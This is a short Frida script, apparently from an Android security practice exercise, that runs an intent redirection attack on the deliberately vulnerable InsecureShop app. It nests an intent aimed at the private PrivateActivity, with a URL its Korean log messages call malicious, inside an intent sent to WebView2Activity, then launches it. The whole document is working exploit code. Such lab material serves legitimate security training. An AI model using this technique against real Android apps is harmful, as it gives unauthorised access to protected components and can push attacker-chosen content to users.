Java.perform(function () {
    var Intent = Java.use("android.content.Intent");
    var String = Java.use("java.lang.String");

    console.log("[*] 인텐트 리다이렉션 공격 시작");

    var context = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();

    console.log("[*] ApplicationContext 확보 성공");

    var innerIntent = Intent.$new();
    innerIntent.setClassName("com.insecureshop", "com.insecureshop.PrivateActivity");
    innerIntent.putExtra("url", String.$new("https://blog.naver.com/zoono1004"));
    console.log("[*] 내부 인텐트 생성 완료: PrivateActivity + 악성 URL");

    var outerIntent = Intent.$new();
    outerIntent.setClassName("com.insecureshop", "com.insecureshop.WebView2Activity");
    outerIntent.putExtra("extra_intent", innerIntent);
    outerIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK.value);
    console.log("[*] 외부 인텐트 생성 완료: WebView2Activity 호출 준비");

    context.startActivity(outerIntent);
    console.log("[+] startActivity 호출 성공 - 인텐트 리다이렉션 성공");
});
